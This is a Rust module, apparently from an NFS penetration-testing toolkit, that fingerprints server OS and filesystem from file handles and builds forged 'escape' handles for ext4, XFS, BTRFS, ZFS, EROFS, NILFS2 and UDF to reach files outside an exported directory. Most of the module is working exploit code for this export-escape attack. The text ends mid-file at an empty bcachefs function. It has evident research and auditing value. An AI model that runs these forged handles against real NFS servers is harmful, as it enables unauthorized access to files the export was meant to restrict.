//! NFS file handle analysis, fingerprinting, and escape construction.
//!
//! Implements OS/filesystem detection from handle format and constructs
//! escape handles to access files outside the exported directory.

// Struct fields are forensic data values; individual field docs would
// repeat the field name. Context is in the module and finding docs.
// Toolkit API  --  not all items are used in currently-implemented phases.
// All slice/index operations in this module are guarded by explicit len() checks
// before accessing the bytes  --  the bounds are enforced, just not via .get().
use crate::proto::nfs3::types::FileHandle;

/// Detected operating system from file handle format.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum OsGuess {
    Linux,
    Windows,
    FreeBsd,
    /// HP-UX: one-request-per-TCP connection model. Reserved for future TCP behavior fingerprinting.
    #[expect(dead_code, reason = "reserved for future TCP behavior fingerprinting")]
    HpUx,
    Unknown,
}

/// Detected filesystem type from file handle structure.
///
/// Covers all types nfs_analyze identifies from inode patterns
/// in Linux file handles (byte 2 = fsid_type, plus inode structure).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum FsType {
    Ext4,
    Xfs,
    Btrfs,
    Zfs,
    Erofs,
    Udf,
    Iso9660,
    Unknown,
}

/// Windows file handle signing status.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum SigningStatus {
    /// Handle is signed (HMAC bytes are non-zero)
    Enabled,
    /// Handle is NOT signed (HMAC bytes are zero)  --  full FS access possible
    Disabled,
    /// Not a Windows handle (wrong size or format)
    NotApplicable,
}

/// Which NFS version's handle format was checked for Windows signing.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum WindowsHandleVersion {
    /// NFSv3: 32-byte handle, last 10 bytes are HMAC
    V3,
    /// NFSv4.1: 28-byte handle, last 16 bytes are HMAC
    V41,
}

/// Result of file handle entropy analysis.
#[derive(Debug, Clone)]
pub(crate) struct EntropyAnalysis {
    /// Total bits of randomness estimated in the handle
    pub entropy_bits: f64,
    /// Estimated brute-force time at 10,000 attempts/sec
    pub brute_force_seconds: f64,
    /// Which fields contain randomness
    pub random_fields: Vec<String>,
}

/// Filesystem root handle construction for export escape.
#[derive(Debug, Clone)]
pub(crate) struct EscapeResult {
    /// Constructed file handle for filesystem root.
    pub root_handle: FileHandle,
    /// Filesystem type (set by the constructor that produced this candidate).
    pub fs_type: FsType,
    /// Human-readable label for progress display (e.g. "inode 2 gen=0", "BTRFS subvol 5").
    pub label: String,
    /// Confidence level (0.0 - 1.0).
    pub confidence: f64,
    /// Inode number embedded in the constructed handle (root inode, or subvolume ID for BTRFS).
    pub inode_number: u32,
}

/// A handle with a label describing how it was derived.
#[derive(Debug, Clone)]
pub(crate) struct HandleVariant {
    pub handle: FileHandle,
    pub label: String,
}

/// Derive all plausible length variants of a handle by padding and trimming.
///
/// From a single source handle, produces up to 4 variants:
///   raw       -- as-is
///   trimmed   -- trailing zero bytes stripped (min 1 byte retained)
///   padded_32 -- zero-padded to 32 bytes (FHSIZE2, NFSv2 wire format)
///   padded_64 -- zero-padded to 64 bytes (NFS3_FHSIZE maximum)
pub(crate) fn derive_handle_variants(handle: &FileHandle, source: &str) -> Vec<HandleVariant> {
    let bytes = handle.as_bytes();
    let len = bytes.len();
    let mut variants = Vec::with_capacity(4);

    variants.push(HandleVariant { handle: handle.clone(), label: format!("{source}_raw({len}B)") });

    let trimmed_len = bytes.iter().rposition(|&b| b != 0).map_or(1, |i| i + 1);
    if trimmed_len < len
        && let Some(trimmed) = bytes.get(..trimmed_len)
    {
        variants.push(HandleVariant { handle: FileHandle::from_bytes(trimmed), label: format!("{source}_trimmed({trimmed_len}B)") });
    }

    if len < 32 {
        let mut padded = bytes.to_vec();
        padded.resize(32, 0);
        variants.push(HandleVariant { handle: FileHandle::from_bytes(&padded), label: format!("{source}_pad32") });
    }

    if len < 64 {
        let mut padded = bytes.to_vec();
        padded.resize(64, 0);
        variants.push(HandleVariant { handle: FileHandle::from_bytes(&padded), label: format!("{source}_pad64") });
    }

    variants
}

/// Remove duplicate variants (same byte content), keeping the first label.
pub(crate) fn dedup_variants(variants: &mut Vec<HandleVariant>) {
    let mut seen = std::collections::HashSet::new();
    variants.retain(|v| seen.insert(v.handle.as_bytes().to_vec()));
}

/// Analyze and manipulate NFS file handles.
#[derive(Debug)]
pub(crate) struct FileHandleAnalyzer;

impl FileHandleAnalyzer {
    /// Determine the server OS from file handle structure.
    pub(crate) fn fingerprint_os(fh: &FileHandle) -> OsGuess {
        let data = fh.as_bytes();

        if data.len() == 32 {
            // A 32-byte handle is ambiguous: it can be a Windows handle (always
            // 32 bytes, non-zero HMAC tail) OR a Linux knfsd handle for an XFS
            // UUID-based export -- [01 00 fsid_type fileid_type] + 16B UUID fsid
            // (fsid_type 6/7) + 8B 64-bit inode + 4B generation = exactly 32 bytes.
            // Such an XFS handle carries the Linux version/auth marker (01 00) and
            // FILEID_INO64_GEN (0x81); whenever the file's generation is non-zero
            // its trailing bytes are non-zero, which would otherwise trip the
            // Windows heuristic below. Exclude Linux-format handles first so an
            // XFS handle is not misfingerprinted as Windows (the Linux check below
            // then classifies it correctly).
            let linux_marker = data.first().copied() == Some(0x01) && data.get(1).copied() == Some(0x00);
            if !linux_marker {
                // Windows handles have non-zero trailing bytes; Linux NFSv2 pads with zeros.
                let tail_nonzero = data.get(28..32).is_some_and(|s| s != [0u8, 0, 0, 0]);
                let hmac_nonzero = data.get(22..32).is_some_and(|s| s.iter().any(|&b| b != 0));
                if tail_nonzero || hmac_nonzero {
                    return OsGuess::Windows;
                }
            }
        }

        // Linux: version=1, auth_type=0
        if data.first().copied() == Some(0x01) && data.get(1).copied() == Some(0x00) {
            return OsGuess::Linux;
        }

        // FreeBSD: starts with fsid (8 bytes) that often has high values
        if data.len() >= 20
            && let (Some(&b8), Some(&b9)) = (data.get(8), data.get(9))
        {
            let fid_len = u16::from_be_bytes([b8, b9]);
            if fid_len == 12 {
                return OsGuess::FreeBsd;
            }
        }

        OsGuess::Unknown
    }

    /// Identify filesystem type from a Linux file handle.
    ///
    /// Uses the same inode-pattern heuristics as nfs_analyze: fsid_type (byte 2)
    /// combined with inode numbering patterns to distinguish ext4/xfs/btrfs and
    /// detect rarer filesystems (udf, nilfs, fat, lustre).
    pub(crate) fn fingerprint_fs(fh: &FileHandle) -> FsType {
        let data = fh.as_bytes();
        if data.len() < 8 {
            return FsType::Unknown;
        }

        let Some(&fsid_type) = data.get(2) else { return FsType::Unknown };
        let Some(&fileid_type) = data.get(3) else { return FsType::Unknown };

        // fileid_type identifies the FS before we even look at fsid_type.
        // Check all known fileid_type markers first.
        if (0x4d..=0x4f).contains(&fileid_type) {
            return FsType::Btrfs;
        }
        // FILEID_INO64_GEN (0x81) is only emitted by Linux XFS when inodes exceed
        // 2^32.  ext4 always uses 32-bit inodes (FILEID_INO32_GEN = 0x01).
        if fileid_type == 0x81 {
            return FsType::Xfs;
        }

        // Compound UUID handle (fsid_type=7, fileid_type=0, 28 bytes):
        //   [header 4B] | [export_inode 4B] | [export_gen 4B] | [UUID 16B]
        // The export_inode distinguishes some FS types: ext4 root=2, XFS root=32/64/128.
        // BTRFS FS_TREE_OBJECTID=5 is unambiguous. Higher inodes (256+) are ambiguous:
        // could be a BTRFS user subvol (256 is the first) or a regular ext4/XFS directory.
        if fsid_type == 7 && fileid_type == 0 && data.len() == 28 {
            if let (Some(&b0), Some(&b1), Some(&b2), Some(&b3)) = (data.get(4), data.get(5), data.get(6), data.get(7)) {
                let export_inode = u32::from_le_bytes([b0, b1, b2, b3]);
                return match export_inode {
                    5 => FsType::Btrfs,
                    2 => FsType::Ext4,
                    32 | 64 | 128 => FsType::Xfs,
                    _ => FsType::Unknown,
                };
            }
            return FsType::Unknown;
        }

        let fsid_len = match fsid_type {
            0 | 3..=5 => 8, // dev major:minor
            1 => 4,         // dev number only
            2 => 12,        // dev + UUID prefix
            6 => 16,        // UUID-based: 16-byte UUID
            7 => 24,        // compound UUID: export_inode(4) + export_gen(4) + UUID(16) = 24 (kernel FSID_UUID16_INUM key_len)
            _ => return FsType::Unknown,
        };

        // Use the inode embedded in the handle (the export root's inode) to distinguish
        // filesystem types.  This is the most reliable signal when fileid_type alone is
        // ambiguous (0x01 is shared by ext4, ext3, and old-format XFS).
        if data.len() > 4 + fsid_len + 4 {
            let inode_offset = 4 + fsid_len;
            if let (Some(&b0), Some(&b1), Some(&b2), Some(&b3)) = (data.get(inode_offset), data.get(inode_offset + 1), data.get(inode_offset + 2), data.get(inode_offset + 3)) {
                let inode = u32::from_le_bytes([b0, b1, b2, b3]);
                match inode {
                    2 => return FsType::Ext4,            // ext3/ext4 root inode is always 2
                    32 | 64 | 128 => return FsType::Xfs, // XFS root (varies by inode size)
                    _ => {},                             // ambiguous -- fall through
                }
            }
        }

        match fsid_type {
            0 => FsType::Ext4,    // device-based fsid without a UUID -- assume ext4
            _ => FsType::Unknown, // UUID-based with inconclusive inode: try all candidates
        }
    }

    /// Check Windows file handle signing.
    ///
    /// Two formats exist (discovered by nfs_analyze):
    /// - **NFSv3**: 32-byte handle, last 10 bytes (offset 22..32) are HMAC.
    /// - **NFSv4.1**: 28-byte handle, last 16 bytes (offset 12..28) are HMAC.
    ///
    /// All-zero HMAC means signing is disabled -> arbitrary handle forgery possible.
    pub(crate) fn check_windows_signing(fh: &FileHandle) -> SigningStatus {
        let data = fh.as_bytes();

        // NFSv3: 32-byte handle, HMAC in last 10 bytes (offset 22..32)
        if data.len() == 32 {
            let all_zero = data.get(22..32).is_some_and(|s| s.iter().all(|&b| b == 0));
            return if all_zero { SigningStatus::Disabled } else { SigningStatus::Enabled };
        }

        // NFSv4.1: 28-byte handle, HMAC in last 16 bytes (offset 12..28)
        if data.len() == 28 {
            let all_zero = data.get(12..28).is_some_and(|s| s.iter().all(|&b| b == 0));
            return if all_zero { SigningStatus::Disabled } else { SigningStatus::Enabled };
        }

        SigningStatus::NotApplicable
    }

    /// Returns `V3` for 32-byte handles and `V41` for 28-byte handles, which are
    /// the two known Windows NFS handle formats. Returns `None` for any other size.
    pub(crate) fn detect_windows_handle_version(fh: &FileHandle) -> Option<WindowsHandleVersion> {
        match fh.as_bytes().len() {
            32 => Some(WindowsHandleVersion::V3),
            28 => Some(WindowsHandleVersion::V41),
            _ => None,
        }
    }

    /// Construct a file handle targeting an arbitrary inode on the same filesystem.
    ///
    /// This is the generic primitive behind export escape. When `subtree_check` is
    /// disabled (Linux default), the server only verifies the fsid, not that the inode
    /// falls within the export. By rewriting the inode field, we can reach any file.
    ///
    /// `construct_root_candidates` is sugar that calls this with the FS root inode.
    /// Researchers can call this directly with any inode + generation to target
    /// specific files discovered via inode enumeration or brute-force.
    pub(crate) fn construct_handle_for_inode(export_fh: &FileHandle, inode: u32, generation: u32) -> Option<EscapeResult> {
        let data = export_fh.as_bytes();
        if data.len() < 8 {
            return None;
        }

        // Only works on Linux handles (version=1, auth=0)
        if data.first().copied() != Some(0x01) || data.get(1).copied() != Some(0x00) {
            return None;
        }

        let &fsid_type = data.get(2)?;
        let &fileid_type = data.get(3)?;

        // BTRFS handles (fileid_type 0x4d..=0x4f) use a completely different fileid
        // layout and are not constructable via this function -- use
        // construct_btrfs_subvol_handles instead.
        if (0x4d..=0x4f).contains(&fileid_type) {
            return None;
        }

        // --- COMPOUND UUID handle (fsid_type=7, 28-byte export-root handles) ---
        //
        // Linux knfsd with UUID-based exports uses a two-layer handle format:
        //
        //   FILEID_ROOT (fileid_type=0, 28 bytes)  -- returned by MOUNT for export dir:
        //     [01][00][07][00] | inode_low(4LE) | inode_high(4LE) | UUID(16)
        //
        //   FILEID_INO32_GEN_PARENT (fileid_type=2, 44 bytes) -- canonical escape format per
        //   the nfs-security-tooling wiki and nfs_analyze reference implementation:
        //     [01][00][07][02] | inode_low(4LE) | inode_high(4LE) | UUID(16)
        //                      | file_inode(4LE) | file_gen(4LE)
        //                      | parent_inode(4LE) | parent_gen(4LE)
        //   The root directory is its own parent, so parent_inode == inode, parent_gen == gen.
        //
        // With no_subtree_check (Linux default), the server validates only the UUID/fsid,
        // not that the appended inode falls within the exported subtree (F-2.1).
        //
        // Reference: nfs_analyze.py lines 564-565, wiki 5_1-Accessing-files-outside-export.md
        if fsid_type == 7 && fileid_type == 0 && data.len() == 28 {
            let export_ctx = data.get(4..28)?; // 24 bytes: dir_inode + dir_gen + UUID
            let mut handle_data = Vec::with_capacity(44);
            handle_data.push(0x01);
            handle_data.push(0x00);
            handle_data.push(0x07); // fsid_type=7
            handle_data.push(0x02); // fileid_type=2 (FILEID_INO32_GEN_PARENT)
            handle_data.extend_from_slice(export_ctx);
            handle_data.extend_from_slice(&inode.to_le_bytes()); // file inode
            handle_data.extend_from_slice(&generation.to_le_bytes()); // file gen
            handle_data.extend_from_slice(&inode.to_le_bytes()); // parent inode (root = own parent)
            handle_data.extend_from_slice(&generation.to_le_bytes()); // parent gen
            // Infer the filesystem type from the root inode number.
            // ext4 root is always inode 2; XFS root: 128 (v5), 64 (v4 512B inodes), 32 (v4 1024B inodes).
            // Any other inode is ambiguous -- leave Unknown.
            let inferred_fs = match inode {
                2 => FsType::Ext4,
                32 | 64 | 128 => FsType::Xfs,
                _ => FsType::Unknown,
            };
            return Some(EscapeResult { root_handle: FileHandle(handle_data), fs_type: inferred_fs, label: format!("inode {inode} gen={generation}"), confidence: if generation == 0 { 0.7 } else { 0.9 }, inode_number: inode });
        }

        // --- Standard single-layer handles ---
        //
        // fsid_type determines how many bytes of fsid to preserve verbatim.
        // Unsupported types cannot be reconstructed.
        let fsid_len = match fsid_type {
            0 | 3..=5 => 8, // dev major:minor (32+32 bits)
            1 => 4,         // dev number only (32 bits)
            2 => 12,        // dev + UUID prefix
            6 => 16,        // UUID-based: 16-byte UUID
            7 => 24,        // compound UUID: export_inode(4) + export_gen(4) + UUID(16) = 24 (kernel FSID_UUID16_INUM key_len); matches construct_btrfs_subvol_handles
            _ => return None,
        };

        if data.len() < 4 + fsid_len {
            return None;
        }

        // Derive the fileid encoding format from the MOUNT handle's fileid_type.
        // This is the key insight: the FS type determines the inode width, and
        // fileid_type in the mount handle directly encodes that width.
        //
        //   FILEID_INO64_GEN (0x81) -- XFS only, 64-bit inode + 32-bit gen = 12 bytes
        //   FILEID_INO32_GEN (0x01) -- ext3/ext4 and 32-bit-compat XFS, 32-bit inode + gen = 8 bytes
        //   BTRFS (0x4d..=0x4f)    -- handled in the branch above, never reaches here
        //
        // Using fileid_type (not fsid_type) avoids the false "UUID = XFS" assumption
        // and correctly handles ext3/ext4 exports that use UUID-based fsids.
        let (target_fileid_type, inferred_fs) = if fileid_type == 0x81 {
            (0x81u8, FsType::Xfs)
        } else {
            (
                0x01u8,
                match inode {
                    2 => FsType::Ext4,
                    32 | 64 | 128 => FsType::Xfs,
                    _ => FsType::Unknown,
                },
            )
        };

        let fsid_slice = data.get(4..4 + fsid_len)?;
        let mut handle_data = Vec::with_capacity(4 + fsid_len + 12);
        handle_data.push(0x01);
        handle_data.push(0x00);
        handle_data.push(fsid_type);
        handle_data.push(target_fileid_type);
        handle_data.extend_from_slice(fsid_slice);

        if target_fileid_type == 0x81 {
            // XFS: 64-bit inode (8 bytes) + 32-bit generation (4 bytes)
            handle_data.extend_from_slice(&u64::from(inode).to_le_bytes());
        } else {
            // ext4/ext3: 32-bit inode (4 bytes) + 32-bit generation (4 bytes)
            handle_data.extend_from_slice(&inode.to_le_bytes());
        }
        handle_data.extend_from_slice(&generation.to_le_bytes());

        Some(EscapeResult { root_handle: FileHandle(handle_data), fs_type: inferred_fs, label: format!("inode {inode} gen={generation}"), confidence: if generation == 0 { 0.7 } else { 0.9 }, inode_number: inode })
    }

    /// INO32_GEN candidate table: all plausible (inode, generation) pairs for
    /// standard Linux file handles, ordered by likelihood.
    ///
    /// Covers ext2/3/4 (2,0), f2fs (3,0), XFS (128/64/32,0), VFAT (1,0),
    /// reiserfs (2,1), NTFS3 (5,5), JFS/squashfs (caught by 2,0).
    /// The probe layer rejects non-directory hits and self-matches, so false
    /// positives from non-root inodes (e.g. ext4 inode 128 = journal) are safe.
    /// INO32_GEN candidate table: (inode, generation, label).
    ///
    /// Ordered by likelihood. The probe layer rejects non-directory hits
    /// and self-matches, so false positives are safe.
    const INO32_GEN_CANDIDATES: &'static [(u32, u32, &'static str)] = &[
        (2, 0, "inode 2 gen=0 (ext2/3/4, JFS)"),
        (3, 0, "inode 3 gen=0 (f2fs)"),
        (1, 0, "inode 1 gen=0 (VFAT)"),
        (128, 0, "inode 128 gen=0 (XFS v5)"),
        (64, 0, "inode 64 gen=0 (XFS v4)"),
        (32, 0, "inode 32 gen=0 (XFS v4 1024B)"),
        (5, 5, "inode 5 gen=5 (NTFS3)"),
        (2, 1, "inode 2 gen=1 (reiserfs)"),
        (7, 0, "inode 7 gen=0 (squashfs)"),
    ];

    /// All plausible INO32_GEN root candidates from the static table.
    ///
    /// For compound UUID seeds (fsid_type=7), each table entry produces both a
    /// fsid_type=7 and a fsid_type=6 (UUID-only) variant.
    pub(crate) fn construct_root_candidates(export_fh: &FileHandle) -> Vec<EscapeResult> {
        Self::INO32_GEN_CANDIDATES
            .iter()
            .flat_map(|&(inode, generation, label)| {
                let mut variants = Self::construct_candidates_all_variants(export_fh, inode, generation);
                for r in &mut variants {
                    label.clone_into(&mut r.label);
                }
                variants
            })
            .collect()
    }

    /// Produce escape candidates for all fsid variants of the seed handle.
    ///
    /// For compound UUID seeds (fsid_type=7), generates both the full-context
    /// variant (fsid_type=7) and the UUID-only variant (fsid_type=6). For all
    /// other seed types, returns a single variant (same as `construct_handle_for_inode`).
    pub(crate) fn construct_candidates_all_variants(export_fh: &FileHandle, inode: u32, generation: u32) -> Vec<EscapeResult> {
        let mut results = Vec::new();

        // Primary variant with original fsid
        if let Some(r) = Self::construct_handle_for_inode(export_fh, inode, generation) {
            results.push(r);
        }

        // Compound UUID (fsid_type=7): also try fsid_type=6 (UUID-only).
        // Build a synthetic handle with fsid_type=6 and the 16-byte UUID, then run
        // it through construct_handle_for_inode which naturally produces the right
        // fileid layout via the standard path.
        let data = export_fh.as_bytes();
        let is_compound = data.len() >= 28 && data.first().copied() == Some(0x01) && data.get(1).copied() == Some(0x00) && data.get(2).copied() == Some(7);

        if is_compound {
            // UUID sits at bytes 12..28 in compound UUID handles (after 4B header + 4B export_inode + 4B export_gen).
            if let Some(uuid) = data.get(12..28) {
                let fileid_type = data.get(3).copied().unwrap_or(0);
                let mut fake = vec![0x01, 0x00, 0x06, fileid_type];
                fake.extend_from_slice(uuid);
                let fake_fh = FileHandle::from_bytes(&fake);
                if let Some(mut r) = Self::construct_handle_for_inode(&fake_fh, inode, generation) {
                    r.confidence *= 0.9;
                    results.push(r);
                }
            }
        }

        results
    }

    /// Generate BTRFS subvolume escape handles.
    ///
    /// BTRFS FILEID_WITHOUT_PARENT (0x4d) layout (per kernel fs/btrfs/export.c):
    ///   objectid      (u64 LE) -- inode object ID within the subvolume; always
    ///                             BTRFS_FIRST_FREE_OBJECTID (256) for the root dir
    ///   root_objectid (u64 LE) -- subvolume/tree ID
    ///   gen           (u32 LE) -- generation number
    ///
    /// Candidates tried:
    ///   1. FS_TREE_OBJECTID (5)  -- the default subvolume on any fresh btrfs filesystem
    ///   2. User subvolumes 256 .. 256 + max_subvols  -- user-created subvolumes
    pub(crate) fn construct_btrfs_subvol_handles(export_fh: &FileHandle, max_subvols: u32) -> Vec<EscapeResult> {
        // BTRFS_FIRST_FREE_OBJECTID: the inode object ID of any subvolume root directory.
        const ROOT_OBJECTID: u64 = 256;
        // BTRFS_FS_TREE_OBJECTID: the default/main subvolume on a fresh btrfs filesystem.
        const FS_TREE_OBJECTID: u64 = 5;

        let data = export_fh.as_bytes();
        if data.len() < 8 || data.first().copied() != Some(0x01) || data.get(1).copied() != Some(0x00) {
            return Vec::new();
        }

        let Some(&fsid_type) = data.get(2) else { return Vec::new() };

        // For compound UUID MOUNT handles (fsid_type=7, fileid_type=0, 28 bytes) the
        // 24-byte export context embeds [export_inode(4)][export_gen(4)][UUID(16)].
        // BTRFS LOOKUP handles may use EITHER:
        //   (a) fsid_type=7 with the full 24-byte export context as fsid, OR
        //   (b) fsid_type=6 with just the 16-byte UUID as fsid.
        // We generate both variants and let the probe oracle determine which the server accepts.
        let is_compound_uuid = fsid_type == 7 && data.get(3).copied() == Some(0x00) && data.len() == 28;

        // Standard fsid extraction for non-compound handles.
        let fsid_len = match fsid_type {
            0 | 3..=5 => 8,
            1 => 4,
            2 => 12,
            6 => 16,
            7 => 24, // compound UUID: use all 24 bytes of export context as fsid
            _ => return Vec::new(),
        };

        let Some(fsid_slice) = data.get(4..4 + fsid_len) else { return Vec::new() };

        // For compound UUID: also extract just the 16-byte UUID (bytes 12..28).
        let uuid_only: Option<&[u8]> = if is_compound_uuid { data.get(12..28) } else { None };

        // Build a BTRFS handle targeting `root_objectid` (subvolume ID).
        // fileid = objectid(8) + root_objectid(8) + gen(4) = 20 bytes.
        let make_handle = |ftype: u8, flen: usize, fsid: &[u8], root_id: u64, confidence: f64| {
            let mut handle_data = Vec::with_capacity(4 + flen + 20);
            handle_data.push(0x01);
            handle_data.push(0x00);
            handle_data.push(ftype);
            handle_data.push(0x4d); // FILEID_BTRFS_WITHOUT_PARENT
            handle_data.extend_from_slice(fsid);
            handle_data.extend_from_slice(&ROOT_OBJECTID.to_le_bytes()); // root dir inode
            handle_data.extend_from_slice(&root_id.to_le_bytes()); // subvolume ID
            handle_data.extend_from_slice(&0u32.to_le_bytes()); // gen = 0
            #[expect(clippy::cast_possible_truncation, reason = "subvol IDs fit in u32 in practice")]
            EscapeResult { root_handle: FileHandle(handle_data), fs_type: FsType::Btrfs, label: format!("BTRFS subvol {root_id}"), confidence, inode_number: root_id as u32 }
        };

        let mut results = Vec::with_capacity((1 + max_subvols as usize) * 2);
        let subvol_ids = std::iter::once(FS_TREE_OBJECTID).chain(256..256 + u64::from(max_subvols));

        for root_id in subvol_ids {
            let confidence = if root_id == FS_TREE_OBJECTID { 0.7 } else { 0.3 };
            // Primary: fsid_type as in MOUNT handle.
            results.push(make_handle(fsid_type, fsid_len, fsid_slice, root_id, confidence));
            // For compound UUID: also try fsid_type=6 with pure UUID (the alternative format).
            if let Some(uuid) = uuid_only {
                results.push(make_handle(6, 16, uuid, root_id, confidence * 0.9));
            }
        }
        results
    }

    /// Construct ZFS root handles targeting object 34 (the ZFS root dataset root object).
    ///
    /// ZFS on Linux (OpenZFS via zfs-fuse or the kernel module) uses a completely
    /// different FID format from the standard Linux FILEID_INO32_GEN:
    ///
    ///   zfid_short_t = { zf_len: u16 LE, zf_object: [u8; 6] LE, zf_gen: [u8; 4] LE }
    ///
    /// The root object of every ZFS dataset is object 34 (OBJ_DIR_OBJECTID),
    /// and ZFS accepts gen=0 as a wildcard for the root object (bypass).
    ///
    /// The handle header is the standard Linux knfsd format: version(1) + pad(1) +
    /// fsid_type(1) + fileid_type(1) + fsid data. We preserve the fsid from the
    /// export handle and replace the fileid with the ZFS root FID.
    ///
    /// For compound UUID seeds (fsid_type=7), produces both fsid_type=7 and
    /// fsid_type=6 (UUID-only) variants.
    pub(crate) fn construct_zfs_root_handle(export_fh: &FileHandle) -> Vec<EscapeResult> {
        let variants = extract_fsid_variants(export_fh);
        if variants.is_empty() {
            return Vec::new();
        }

        variants
            .iter()
            .enumerate()
            .map(|(i, (fsid_type, fsid))| {
                // Build handle: fsid variant + fileid_type=1 (what ZFS returns) + zfid_short_t
                let mut handle = Vec::with_capacity(4 + fsid.len() + 12);
                handle.push(0x01);
                handle.push(0x00);
                handle.push(*fsid_type);
                handle.push(1); // fileid_type = 1 (FILEID_INO32_GEN -- what ZFS uses on knfsd)
                handle.extend_from_slice(fsid);

                // zfid_short_t: zf_len(u16 LE) = 10, zf_object[6](LE) = 34, zf_gen[4](LE) = 0
                handle.extend_from_slice(&10u16.to_le_bytes()); // zf_len = 10 (total FID payload size)
                handle.push(34); // object byte 0 = 34
                handle.extend_from_slice(&[0u8; 5]); // object bytes 1-5 (34 fits in one byte)
                handle.extend_from_slice(&[0u8; 4]); // gen = 0 (root bypass -- ZFS accepts gen=0 for root object)

                let confidence = if i == 0 { 0.7 } else { 0.7 * 0.9 };
                EscapeResult { root_handle: FileHandle::from_bytes(&handle), fs_type: FsType::Zfs, label: "ZFS root object 34".to_owned(), confidence, inode_number: 34 }
            })
            .collect()
    }

    /// Construct EROFS root handle candidates using FILEID_INO64_GEN (0x81).
    ///
    /// EROFS encodes a 64-bit nid (node ID) split across two u32 words, plus a
    /// generation that the kernel **ignores** (read-only FS, no staleness).
    /// Root nid is filesystem-specific but commonly small (e.g. 36).
    /// Since the brute-force INO32_GEN scan can't produce 0x81 handles, this
    /// constructor is needed for EROFS exports.
    ///
    /// For compound UUID seeds (fsid_type=7), produces both fsid_type=7 and
    /// fsid_type=6 (UUID-only) variants.
    pub(crate) fn construct_erofs_root_handle(export_fh: &FileHandle, root_nid: u64) -> Vec<EscapeResult> {
        let variants = extract_fsid_variants(export_fh);
        if variants.is_empty() {
            return Vec::new();
        }

        variants
            .iter()
            .enumerate()
            .map(
                #[expect(clippy::cast_possible_truncation, reason = "EROFS root nid fits in u32")]
                |(i, (fsid_type, fsid))| {
                    let mut handle = Vec::with_capacity(4 + fsid.len() + 12);
                    handle.push(0x01);
                    handle.push(0x00);
                    handle.push(*fsid_type);
                    handle.push(0x81); // FILEID_INO64_GEN
                    handle.extend_from_slice(fsid);
                    handle.extend_from_slice(&((root_nid >> 32) as u32).to_le_bytes()); // nid_hi
                    handle.extend_from_slice(&(root_nid as u32).to_le_bytes()); // nid_lo
                    handle.extend_from_slice(&0u32.to_le_bytes()); // gen=0 (ignored by EROFS)
                    let confidence = if i == 0 { 0.7 } else { 0.7 * 0.9 };
                    EscapeResult { root_handle: FileHandle::from_bytes(&handle), fs_type: FsType::Erofs, label: format!("EROFS nid {root_nid}"), confidence, inode_number: root_nid as u32 }
                },
            )
            .collect()
    }

    /// Construct NILFS2 root handle candidates using FILEID_NILFS_WITHOUT_PARENT (0x61).
    ///
    /// nilfs_fid = { cno: u64, ino: u64, gen: u32 }. The checkpoint number (cno)
    /// for the current mount is 0. Gen=0 bypasses the generation check (lenient:
    /// `if (gen && gen != inode->i_generation) return -ESTALE`).
    ///
    /// For compound UUID seeds (fsid_type=7), generates BOTH fsid_type=7 (full
    /// context) and fsid_type=6 (UUID-only) variants -- same strategy as BTRFS.
    pub(crate) fn construct_nilfs2_root_handles(export_fh: &FileHandle) -> Vec<EscapeResult> {
        let Some((fsid_type, fsid)) = extract_fsid(export_fh) else { return Vec::new() };
        let is_compound = fsid_type == 7 && fsid.len() == 24;
        let uuid_only: Option<&[u8]> = if is_compound { fsid.get(8..24) } else { None };

        let make = |ft: u8, fs: &[u8]| {
            let mut handle = Vec::with_capacity(4 + fs.len() + 20);
            handle.push(0x01);
            handle.push(0x00);
            handle.push(ft);
            handle.push(0x61); // FILEID_NILFS_WITHOUT_PARENT
            handle.extend_from_slice(fs);
            handle.extend_from_slice(&0u64.to_le_bytes()); // cno = 0
            handle.extend_from_slice(&2u64.to_le_bytes()); // ino = 2 (root)
            handle.extend_from_slice(&0u32.to_le_bytes()); // gen = 0 (lenient)
            EscapeResult { root_handle: FileHandle::from_bytes(&handle), fs_type: FsType::Unknown, label: "NILFS2 inode 2 cno=0".to_owned(), confidence: 0.6, inode_number: 2 }
        };

        let mut results = vec![make(fsid_type, fsid)];
        if let Some(uuid) = uuid_only {
            results.push(make(6, uuid));
        }
        results
    }

    /// Construct UDF root handle candidates using FILEID_UDF_WITHOUT_PARENT (0x51).
    ///
    /// UDF uses logical block addressing, not inodes. The root directory's block
    /// number varies per volume. We try a range of common block numbers since the
    /// gen=0 check is lenient (`if (gen && gen != ...) return -ESTALE`).
    ///
    /// For compound UUID seeds (fsid_type=7), produces both fsid_type=7 and
    /// fsid_type=6 (UUID-only) variants per block.
    pub(crate) fn construct_udf_root_candidates(export_fh: &FileHandle) -> Vec<EscapeResult> {
        let fsid_variants = extract_fsid_variants(export_fh);
        if fsid_variants.is_empty() {
            return Vec::new();
        }
        // UDF root blocks vary per volume. Common values on mkudffs-formatted media
        // are in the range 64..512. We try a representative set.
        let blocks: &[u32] = &[66, 130, 258, 2, 64, 128, 256, 512];
        blocks
            .iter()
            .flat_map(|&block| {
                fsid_variants.iter().enumerate().map(move |(i, (fsid_type, fsid))| {
                    let mut handle = Vec::with_capacity(4 + fsid.len() + 12);
                    handle.push(0x01);
                    handle.push(0x00);
                    handle.push(*fsid_type);
                    handle.push(0x51); // FILEID_UDF_WITHOUT_PARENT
                    handle.extend_from_slice(fsid);
                    handle.extend_from_slice(&block.to_le_bytes()); // logicalBlockNum
                    handle.extend_from_slice(&0u16.to_le_bytes()); // partref = 0
                    handle.extend_from_slice(&0u16.to_le_bytes()); // parent_partref = 0
                    handle.extend_from_slice(&0u32.to_le_bytes()); // gen = 0 (lenient)
                    let confidence = if i == 0 { 0.4 } else { 0.4 * 0.9 };
                    EscapeResult { root_handle: FileHandle::from_bytes(&handle), fs_type: FsType::Udf, label: format!("UDF block {block}"), confidence, inode_number: block }
                })
            })
            .collect()
    }

    /// Construct bcachefs root handle candidates using FILEID_BCACHEFS_WITHOUT_PARENT (0xb1).
    ///
    /// bcachefs_fid = { inum: u64, subvol: u32, gen: u32 }.
    /// Root is inum=4096 (BCACHEFS_ROOT_INO), subvol=1 (BCACHEFS_ROOT_SUBVOL).
    /// Gen=0 was observed to be accepted on 6.8 kernels despite the kernel source
    /// showing a strict check -- empirically confirmed via live testing.
    ///
    /// For compound UUID seeds (fsid_type=7), produces both fsid_type=7 and
    /// fsid_type=6 (UUID-only) variants.
    pub(crate) fn construct_bcachefs_root_handle(export_fh: &FileHandle) -> Vec<EscapeResult> {
